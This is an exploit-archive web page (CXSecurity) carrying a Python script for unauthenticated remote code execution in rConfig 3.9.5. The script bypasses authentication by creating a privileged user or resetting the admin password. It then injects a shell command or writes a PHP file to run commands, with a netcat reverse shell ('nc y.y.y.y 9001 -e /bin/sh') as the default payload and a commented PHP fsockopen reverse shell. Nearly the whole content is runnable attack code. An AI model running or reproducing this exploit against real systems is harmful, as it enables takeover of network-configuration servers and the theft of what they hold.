	
<!DOCTYPE html>
<HTML lang="en">
<HEAD>
<META http-equiv="Content-Type" content="text/html; charset=utf-8">
<TITLE>rConfig 3.9.5 Remote Code Execution (Unauthenticated) - CXSecurity.com</TITLE>
<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<META name="keywords" content="rConfig, 3.9.5, Remote, Code, Execution, (Unauthenticated), exploit, vulnerability, bug, issue, advisories">
<META name="description" content="Daniel Monzón  has realised a new security note rConfig 3.9.5 Remote Code Execution (Unauthenticated) ">
<META name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<META name="mobile-web-app-capable" content="yes">
<link rel="manifest" href="/manifest.json?b">
<LINK rel="Icon" href="https://cert.cx/cxstatic/favicon.ico" type="image/x-icon">
<script type="text/javascript" src="https://cert.cx/cxstatic/js/m-jq.js?T"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
<script type="text/javascript" src="https://cert.cx/cxstatic/js/m.js?V"></script>
<link href="https://cert.cx/cxstatic/css/b.css?G" rel="stylesheet" type='text/css'/>
</HEAD>
<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-39628967-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script><BODY ng-app="ui.bootstrap.demo">
<div class="navbar navbar-default navbar-fixed-top" id="frezz">
<div class="container"><div class="navbar-header"><a class="navbar-brand" href="https://cxsecurity.com/"><IMG SRC="https://cert.cx/cxstatic/images/12018/cxseci.png" width="150" height="20" ALT="Home Page"></a><button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button></div><div class="navbar-collapse collapse" id="navbar-main" ><ul class="nav navbar-nav">
          <li><a href="https://cxsecurity.com/">Home</a></li><li class="active">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Bugtraq<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/wlb/">Full List</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/bugs/">Only Bugs</a></li>
<li><a href="https://cxsecurity.com/tricks/">Only Tricks</a></li>
<li><a href="https://cxsecurity.com/exploit/">Only Exploits</a></li>
<li><a href="https://cxsecurity.com/dorks/">Only Dorks</a></li>
<li><a href="https://cxsecurity.com/cvelist/">Only CVE</a></li>
<li><a href="https://cxsecurity.com/cwelist/">Only CWE</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/bogus/">Fake Notes</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/best/1/">Ranking</a></li>

</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">CVEMAP<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/cvemap/">Full List</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cvevendors/">Show Vendors</a></li>
<li><a href="https://cxsecurity.com/cveproducts/">Show Products</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/allcwe/">CWE Dictionary</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cve/">Check CVE Id </a></li>
<li><a href="https://cxsecurity.com/cwe/">Check CWE Id</a></li>
</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Search<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/search/">Bugtraq</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/search/cve/">CVEMAP</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/search/author/">By author</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cve/">CVE Id</a></li>
<li><a href="https://cxsecurity.com/cwe/">CWE Id</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cvevendors/">By vendors</a></li>
<li><a href="https://cxsecurity.com/cveproducts/">By products</a></li>
</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">RSS<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/wlb/rss/all/">Bugtraq</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cverss/fullmap/">CVEMAP</a></li>
<li><a href="https://cxsecurity.com/cveproducts/">CVE Products</a></li>
    <li class="divider"></li>
<li><a href="https://cxsecurity.com/wlb/rss/vulnerabilities/">Bugs</a></li>
<li><a href="https://cxsecurity.com/wlb/rss/exploit/">Exploits</a></li>
<li><a href="https://cxsecurity.com/wlb/rss/dorks/">Dorks</a></li>
</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">More<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="http://cifrex.org/">cIFrex</a></li>
<li class="divider"></li>
<li><a href="https://www.facebook.com/cxsec">Facebook</a></li>
<li><a href="https://twitter.com/cxsecurity">Twitter</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/donate/">Donate</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/wlb/about/">About</a></li>
</ul></li>
</ul>
<ul class="nav navbar-nav navbar-right">
<li><a href="https://cxsecurity.com/wlb/add/">Submit</a></li>
</ul></div></div></div>
<div id="general"><TABLE width="100%"><TR><TD width="6%"></TD><TD id="boki"></TD><TD id='glowna'><CENTER>
<script src="https://www.google.com/recaptcha/api.js?onload=CaptchaCallback&render=explicit" async defer></script>
<script type="text/javascript">
        var CaptchaCallback = function() {
            var recap1 = grecaptcha.render('Recaptcha1', {'sitekey' : '6LfbQCQTAAAAANKENerevt305dDl_nywcNEn91q6', 'theme' : 'dark', 'callback' : 'setComIt'});
            var recap2 = grecaptcha.render('Recaptcha2', {'sitekey' : '6LfbQCQTAAAAANKENerevt305dDl_nywcNEn91q6', 'theme' : 'dark', 'callback' : 'onSubmit'});
        };
    </script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular-sanitize/1.6.6/angular-sanitize.min.js"></script>
<script type="text/javascript" src="https://cxsecurity.com/js/show.js"></script>
<TABLE cellpadding="0" cellspacing="0" width="100%"><TR><TD>
<DIV ng-non-bindable><CENTER><h4><B>rConfig 3.9.5 Remote Code Execution (Unauthenticated)</B></h4>
<div class="panel panel-default""><div class="panel-body"><div class="container"><div class="row">
<div class="col-xs-12 col-md-3"><div class="well well-sm"><b>2020.10.15</b></div></div>
<div class="col-xs-12 col-md-6"><div class="well well-sm"><U>Credit:</U> <b> <A HREF="https://cxsecurity.com/author/Daniel+Monz%C3%B3n+/1/">Daniel Monzón </a>  </b>
</div></div><div class="col-xs-5 col-md-3"><div class="well well-sm">
  <U>Risk:</U> <b>
<span class="label label-danger">High</span></b>
</div></div><div class="col-xs-3 col-md-3"><div class="well well-sm">
  <U>Local:</U> <b>No</b>
</div></div><div class="col-xs-4 col-md-3"><div class="well well-sm">
  <U>Remote:</U> <b><B>Yes</B></span></b>
</div></div><div class="col-xs-6 col-md-3"><div class="well well-sm">
  <U>CVE:</U> <b>N/A</b>
</div></div><div class="col-xs-6 col-md-3"><div class="well well-sm">
  <U>CWE:</U> <b>N/A</b></div></div></div><P><TABLE width="70%"><TR><TD><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-5074670963595353"
     data-ad-slot="9692700437"
     data-full-width-responsive="true"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></TD></TR>
</TABLE><P></CENTER></div></div></div><P><DIV style="white-space: pre-wrap; word-break: break-all;" ng-non-bindable><div class="well well-sm premex"># Exploit Title: rConfig 3.9.5 - Remote Code Execution (Unauthenticated)

# Google Dork: N/A
# Date: 2020-10-13
# Exploit Author: Daniel Monzón (stark0de)
# Vendor Homepage: https://www.rconfig.com/
# Software Link: https://www.rconfig.com/downloads/rconfig-3.9.5.zip
# Version: rConfig v3.9.5
# Tested on: CentOS 7 x64
# CVE : N/A


import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
import re
#from bs4 import BeautifulSoup

urllib3.disable_warnings()

url=&quot;https://x.x.x.x/&quot; #change this to fit your URL (adding the last slash)
payload=&quot;nc y.y.y.y 9001 -e /bin/sh&quot;  #change this to whatever payload you want
payload_rce= &quot;fileName=../www/test.php&amp;code=&lt;%3fphp+echo+system(&#039;ls&#039;)%3b%3f&gt;&amp;id=3&quot; #if you want to use Method 2 for RCE, use a PHP, urlencoded payload as the value of the code parameter

print(&quot;Connecting to: {}&quot;.format(url))
print(&quot;Connect back is set to: {}, please launch &#039;nc -lv 9001&#039;&quot;.format(payload))

x = requests.get(url+&quot;login.php&quot;, verify=False)
version = re.search(&quot;&lt;p&gt;(.*)&lt;span&gt;&quot;, x.text)
version = version.group(1)

if version == &quot;rConfig Version 3.9.5&quot;:
   print(&quot;Version 3.9.5 confirmed&quot;)
else:
   print(&quot;Version is &quot;+version+ &quot; it may not be vulnerable&quot;)

payload_final=&quot;;&quot;+payload
referer=url+&quot;useradmin.php&quot;
origin=url
proxies = {&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8080&quot;} #in case you need to debug the exploit with Burp, add &#039;, proxies=proxies&#039; to any request

def createuser():

    multipart_data = MultipartEncoder(
       fields={
               &#039;username&#039;: &#039;test&#039;, 
               &#039;password&#039;: &#039;Testing1@&#039;, #password should have a capital letter, lowercase, number and a symbol
               &#039;passconf&#039;: &#039;Testing1@&#039;,
               &#039;email&#039;: &#039;test@test.com&#039;,
               &#039;ulevelid&#039;: &#039;9&#039;,
               &#039;add&#039;: &#039;add&#039;,
               &#039;editid&#039;: &#039;&#039;
              }
       )
    headers = {&#039;Content-Type&#039;: multipart_data.content_type, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Referer&quot;: referer, &quot;Origin&quot;:origin}
    cookies = {&#039;PHPSESSID&#039;: &#039;test&#039;}
    response = requests.post(url+&#039;lib/crud/userprocess.php&#039;, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False)
    if &quot;error&quot; not in response.text:
        print(&quot;(+) User test created&quot;)
    else:
        print(&quot;(-) User couldn&#039;t be created, please debug the exploit&quot;)


def exploit():
    payload = {
    &#039;user&#039;: &#039;test&#039;,
    &#039;pass&#039;: &#039;Testing1@&#039;,
    &#039;sublogin&#039;: &#039;1&#039;
}
    with requests.Session() as s:
         p = s.post(url+&#039;lib/crud/userprocess.php&#039;, data=payload, verify=False)
         if &quot;Stephen Stack&quot; in p.text:
            print(&quot;(-) Exploit failed, could not login as user test&quot;)
         else:
            print(&quot;(+) Log in as test completed&quot;)
            params = {&#039;path&#039;:&#039;test&#039;,
                      &#039;ext&#039;: payload_final
                     }
            rce=s.get(url+&#039;lib/ajaxHandlers/ajaxArchiveFiles.php&#039;, verify=False, params=params)
            if &quot;success&quot; in rce.text:
                print(&quot;(+) Payload executed successfully&quot;)
            else:
                print(&quot;(-) Error when executing payload, please debug the exploit&quot;) #if you used method 2 to auth bypass and 1 for RCE, ignore this message
    payload = {
    &#039;user&#039;: &#039;admin&#039;,
    &#039;pass&#039;: &#039;Testing1@&#039;,
    &#039;sublogin&#039;: &#039;1&#039;
}
    with requests.Session() as s:
         p = s.post(url+&#039;lib/crud/userprocess.php&#039;, data=payload, verify=False)
         if &quot;Stephen Stack&quot; in p.text:
            print(&quot;(-) Exploit failed, could not login as user test&quot;)
         else:
            print(&quot;(+) Log in as test completed&quot;)
            params = {&#039;path&#039;:&#039;test&#039;,
                      &#039;ext&#039;: payload_final
                     }
            rce=s.get(url+&#039;lib/ajaxHandlers/ajaxArchiveFiles.php&#039;, verify=False, params=params)
            if &quot;success&quot; in rce.text:
                print(&quot;(+) Payload executed successfully&quot;)
            else:
                print(&quot;(-) Error when executing payload, please debug the exploit&quot;)


def user_enum_update():
    users=requests.get(url+&#039;useradmin.inc.php&#039;, verify=False)
    #matchObj = re.findall(r&#039;&lt;td align=&quot;center&quot;&gt;(.*?)&lt;/td&gt;&#039;, users.text, re.M|re.I|re.S)
    
    if &quot;admin&quot; in users.text:
      print(&quot;(+) The admin user is present in this rConfig instance&quot;)
      multipart_data = MultipartEncoder(
       fields={
               &#039;username&#039;: &#039;admin&#039;, 
               &#039;password&#039;: &#039;Testing1@&#039;, #password should have a capital letter, lowercase, number and a symbol
               &#039;passconf&#039;: &#039;Testing1@&#039;,
               &#039;email&#039;: &#039;admin@admin.com&#039;,
               &#039;ulevelid&#039;: &#039;9&#039;,
               &#039;add&#039;: &#039;add&#039;,
               &#039;editid&#039;: &#039;1&#039; #you may need to increment this if you want to reset the password of a different user
              }
       )
      headers = {&#039;Content-Type&#039;: multipart_data.content_type, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Referer&quot;: referer, &quot;Origin&quot;:origin}
      cookies = {&#039;PHPSESSID&#039;: &#039;test&#039;}
      response = requests.post(url+&#039;lib/crud/userprocess.php&#039;, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False)
      if &quot;error&quot; not in response.text:
          print(&quot;(+) The new password for the admin user is Testing1@&quot;)
      else:
          print(&quot;(-) Admin user couldn&#039;t be edited, please debug the exploit&quot;)
    elif  &quot;Admin&quot; in users.text:
       print(&quot;(+) There is at least one Admin user, check &quot;+ str(url)+&quot;useradmin.inc.php manually and modify the exploit accordingly (erase the if-elif statements of this function and modify the user payload)&quot;)
    
def template():
    payload = {
    &#039;user&#039;: &#039;admin&#039;,
    &#039;pass&#039;: &#039;Testing1@&#039;,
    &#039;sublogin&#039;: &#039;1&#039;
}
    
    #&lt;%3fphp+%24sock%3Dfsockopen%28%22192.168.1.13%22%2C1234%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%3f&gt;
    headers_rce = {&#039;Content-Type&#039;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Referer&quot;: url+&quot;deviceConnTemplates.php&quot;, &quot;Origin&quot;:origin, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;}
    with requests.Session() as s:
         p = s.post(url+&#039;lib/crud/userprocess.php&#039;, data=payload, verify=False)
         if &quot;Stephen Stack&quot; in p.text:
            print(&quot;(-) Exploit failed, could not login as user test&quot;)
         else:
            print(&quot;(+) Log in as admin completed&quot;)
            rce=s.post(url+&#039;lib/ajaxHandlers/ajaxEditTemplate.php&#039;, verify=False, data=payload_rce, headers=headers_rce)
            if &quot;success&quot; in rce.text:
                print(&quot;(+) File created&quot;)
                rce_req = s.get(url+&#039;test.php.yml&#039;, verify=False)
                print(&quot;(+) Command results: &quot;)
                print(rce_req.text)
            else:
                print(&quot;(-) Error when executing payload, please debug the exploit&quot;)

def main():
    print(&quot;Remote Code Execution + Auth bypass rConfig 3.9.5 by Daniel Monzón&quot;)
    print(&quot;In the last stage if your payload is a reverse shell, the exploit may not launch the success message, but check your netcat ;)&quot;)
    print(&quot;Note: preferred method for auth bypass is 1, because it is less &#039;invasive&#039;&quot;)
    print(&quot;Note2: preferred method for RCE is 2, as it does not need you to know if, for example, netcat has been installed in the target machine&quot;)
    print(&#039;&#039;&#039;Choose method for authentication bypass:
        1) User creation
        2) User enumeration + User edit &#039;&#039;&#039;)
    auth_bypass=str(input(&quot;Method&gt;&quot;))
    if auth_bypass == &quot;1&quot;:
       createuser()
    elif auth_bypass == &quot;2&quot;:
       user_enum_update()
    print(&#039;&#039;&#039;Choose method for RCE:
        1) Unsafe call to exec()
        2) Template edit &#039;&#039;&#039;)
    rce_method=str(input(&quot;Method&gt;&quot;))
    if rce_method == &quot;1&quot;:
       exploit()
    elif rce_method == &quot;2&quot;:
       template()
main()</DIV></P><P class="txt" id="refer"></P></DIV><div class="panel panel-default"">
 <div class="panel-body"><CENTER>
<TABLE width="75%"><TR><TD><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-5074670963595353"
     data-ad-slot="6599633238"
     data-full-width-responsive="true"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></TD></TR></TABLE><BR>
<div class="container"><div class="row">
<div class="col-xs-12 col-md-6"><div class="well well-sm">
<CENTER><A HREF="https://cxsecurity.com/ascii/WLB-2020100091"><FONT SIZE="4"><b>See this note in RAW Version</b></FONT></A></CENTER></div></div>
<div class="col-xs-6 col-md-3"><div class="well well-sm">
<a href="https://twitter.com/share" class="twitter-share-button" data-count="none">Tweet</a>
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script></div></div>
<div class="col-xs-6 col-md-3"><div class="well well-sm">
<div id="fb-root"></div>
<script>(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) return;
js = d.createElement(s); js.id = id;
js.src = "//connect.facebook.net/pl_PL/sdk.js#xfbml=1&version=v2.3";
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="fb-like" data-href="https://cxsecurity.com/issue/WLB-2020100091" data-width="50" data-layout="button" data-action="like" data-show-faces="false" data-share="false"></div></div></div>
<div class="col-xs-12 col-md-12"><div class="well well-sm">
<div class="container">
<div class="group-form inline">
<div class="col-sm-12 col-md-6" valign="middle">
Vote for this issue:
<input type="hidden" id="numberWlb" value="2020100091">
<button type="button" id="dodatnie" class="btn btn-success glyphicon glyphicon-thumbs-up" data-loading-text=" ... "  data-toggle="collapse" data-target="#voteCaptcha" onClick="setPositive()" onLoad="alreV()" value="0">         0</button>
<button type="button" id="ujemne" class="btn btn-danger glyphicon glyphicon-thumbs-down" data-loading-text=" ... " data-toggle="collapse" data-target="#voteCaptcha"  onClick="setNegative()" value="0">       0</button>
</div>
<div class="col-sm-11 col-md-5" valign="middle" id="barr">
<div class="progress progress-striped" style="margin-top: 11px;" >
<div class="progress-bar progress-bar-success active" id="dodatnieBar" data-toggle="collapse" data-target="#voteCaptcha" onClick="setPositive()" onLoad="alreV()" style="width: 50%"><div id="valGreBar">50%</div></div>
<div class="progress-bar progress-bar-danger active" id="ujemneBar" class="btn btn-danger glyphicon glyphicon-thumbs-down" data-loading-text=" ... " data-toggle="collapse" data-target="#voteCaptcha"  onClick="setNegative()" style="width: 50%"><div id="valRedBar">50%</div></div>
</div></div></div></div>
<div id="voteCaptcha" class="collapse">
<BR><div class="g-recaptcha" id="Recaptcha2"></div>
</div>
<div id="thanksVote">
<BR>&nbsp;<BR><div class="alert alert-success" style="background-color: #556B2F;">
<h4><strong>Thanks for you vote!</strong></h4></div>
</div>
<div id="thanksComm">
<BR>&nbsp;<BR><div class="alert alert-success" style="background-color: #556B2F;">
<h4><strong>Thanks for you comment!</strong><br>Your message is in quarantine 48 hours.</h4></div>
</div></CENTER></div></div></div>
<div id="cWlb">
<div class="well well-sm"><input name="wlb" value="2020100091" type="hidden">
<fieldset>
<legend>Comment it here.</legend>
<div class="form-group form-horizontal">
<label for="inputNick" class="col-lg-1 control-label">Nick (*)</label>
<div class="col-lg-11"><input name="n" class="form-control" id="inputNick" placeholder="Nick" style="background-color: black;" onchange="document.getElementById('commCaptcha').style.display='block';"></div></div>
<div class="form-group form-horizontal">
<label for="inputEmail" class="col-lg-1 control-label">Email (*)</label>
<div class="col-lg-11"><input name="e" class="form-control" id="inputEmail" placeholder="Email" style="background-color: black;"></div></div>
<div class="form-group form-horizontal">
<label for="inputYoutube" class="col-lg-1 control-label">Video </label>
<div class="col-lg-11"><input name="v" class="form-control" id="inputVideo" placeholder="Link to Youtube" style="background-color: black;"></div></div>
<div class="form-group form-horizontal">
<label for="textArea" class="col-lg-1 control-label">Text (*)</label>
<div class="col-lg-11">
<textarea name="c" class="form-control" rows="6" id="inputComment" style="background-color: black;"></textarea></div></div>
<div class="form-group form-horizontal">
<div class="col-lg-12" id="commCaptcha" class="collapse"><BR>
<CENTER><div id="Recaptcha1"></div><BR>
<small>(*) - <cite title="requi">required fields. </cite></small> &nbsp;
<button type="reset" class="btn btn-default" style="background-color: transparent; margin-left: 0px; margin-right: 0px;">Cancel</button>
<button type="submit" id="wysl"  style="background-color: black; margin-left: 0px; margin-right: 0px;" class="btn btn-default" onclick="comIt()">Submit</button>
</CENTER>
</div></div></fieldset></div></div>
<div ng-app="ui.bootstrap.demo" ng-controller="myCtrl">
<div ng-repeat="x in comments">
<div class="well well-sm">
<table width="100%"><TR><TD width="7%"><div ng-bind-html="x.video"></div></TD><TD style="max-width: 100%;overflow: visible;"><div align="left" class="breakcx" id="breakcx"><U><b>{{ x.nick }}</b></U> <img width="20" height="14" ng-src="https://cxsecurity.com/images/flags/{{ x.country }}.png"> | <U>Date:</U> {{ x.ux  * 1000 | date:'yyyy-MM-dd' }} <I>{{ x.ux  * 1000 | date:'HH:mm' }}</I> CET+1<HR style="padding: 0px; margin: 5px;"><DIV style="white-space: pre-wrap;">{{ x.comment }}</DIV>
</div>
</TD></TR></table>
</div>
</div><button type="button" id="shomor" class="btn btn-link btn-block" ng-click="getNextCom()">Show all comments</button></div></div></div></CENTER>
</TD></TR></TABLE>
<script>
$("#thanksComm").hide(); $("#cWLb").hide(); $("#thanksVote").hide(); $("#commCaptcha").hide();
if (localStorage.vote2020100091==1) {             
document.getElementById('voteCaptcha').style.display = 'none'; document.getElementById("dodatnie").disabled = true; document.getElementById("ujemne").disabled = true;
 }</script><HR>
Copyright <b>2021</b>, cxsecurity.com<P>&nbsp;
    </TD>
    <TD id='boki'></TD>
    <TD width="6%"></TD>
	</TR>
</TABLE>
<a href="#" class="back-to-top">Back to Top</a>
    </DIV>
    </DIV>
</BODY>
</HTML>
